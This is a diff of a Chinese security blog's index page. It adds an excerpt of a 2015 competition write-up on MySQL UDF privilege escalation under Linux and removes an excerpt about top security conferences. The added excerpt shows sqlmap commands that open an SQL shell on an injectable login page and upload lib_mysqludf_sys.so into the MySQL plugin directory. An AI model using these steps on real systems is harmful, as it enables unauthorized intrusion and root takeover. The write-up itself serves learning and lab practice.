@@ -9,7 +9,7 @@
   <meta name="author" content="ourren">
 
   
-  <meta name="description" content="NLTK在数据抓取完成后，你拿到的数据往往是一篇文章或者一大段文字，在进行其他处理之前，你需要先对文章进行切割或者处理(去除多余字符、特殊符号，分句和分词)，分句主要是可以把有些不需要的句子给去掉，比如长度小于10的。 分句 分句在nltk中没有提供相关的库来实现， &hellip;">
+  <meta name="description" content="前几天做一个小竞赛中有一个题目：给定的测试环境登录页面有POST注入漏洞，于是果断操起sqlmap跑数据，无意中发现当前MySQL连接用户为root，于是想到udf提权「虽然Windows下MySQL提权基本上没问题，但是Linux环境下原来一直没成功过。」，最终成功获取root权限「 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +67,60 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/03/10/linux_mysql_udf_shell/">Linux下MySQL Udf 提权</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-10T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2015/03/10/linux_mysql_udf_shell/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>前几天做一个小竞赛中有一个题目：给定的测试环境登录页面有POST注入漏洞，于是果断操起sqlmap跑数据，无意中发现当前MySQL连接用户为root，于是想到udf提权「虽然Windows下MySQL提权基本上没问题，但是Linux环境下原来一直没成功过。」，最终成功获取root权限「主要问题在于MySQL是以root权限运行」，记录笔记如下，方便以后查阅：</p>
+
+<h3>具体步骤如下</h3>
+
+<ol>
+<li><p>找到MySQL插件目录:</p>
+
+<pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell
+
+ show variables like "%plugin%";
+</code></pre></li>
+<li><p>利用sqlmap上传 <a href="https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so">lib_mysqludf_sys</a>到MySQL插件目录;</p>
+
+<pre><code> python sqlmap.py -u 'http://xxxx' --file-write=/lib_mysqludf_sys.so 
+ --file-dest=/usr/lib/mysql/plugin/
+</code></pre></li>
+</ol>
+
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/2015/03/10/linux_mysql_udf_shell/">继续阅读 →</a>
+    </footer>
+  
+
+
+    </article>
   
   
     <article>
@@ -293,47 +347,6 @@
   
     <footer>
       <a rel="full-article" href="/2015/01/31/ubuntu_beauty_fonts_with_pycharm/">继续阅读 →</a>
-    </footer>
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2015/01/20/top_security_conference/">安全界的顶级会议</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-01-20T00:00:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2015/01/20/top_security_conference/#comments">留言</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>可能很多人(特别是国内的，咳咳)跟我一样读了很多年书，虽然从事的是安全领域的研究，但是国际上顶级的安全会议可能都不知道，我也是最近才研究了一下国际上的安全顶级会议和论文下载方法。</p>
-
-<h4>四大顶会</h4>
-
-<p>安全界有四大著名顶级会议，简称：S&amp;P、CCS、Security、NDSS；其实有两个网页对安全类会议进行了排名，详细排名大家可以参考「1、2」。但是貌似从事安全研究的人员只认这四个会议，导致这四个会议论文的通过率非常低，因此我们只要关注这四个会议的文章就大概知道国际上安全人员在研究些啥东西了；</p>
-
-</div>
-  
-  
-    <footer>
-      <a rel="full-article" href="/2015/01/20/top_security_conference/">继续阅读 →</a>
     </footer>
   
 
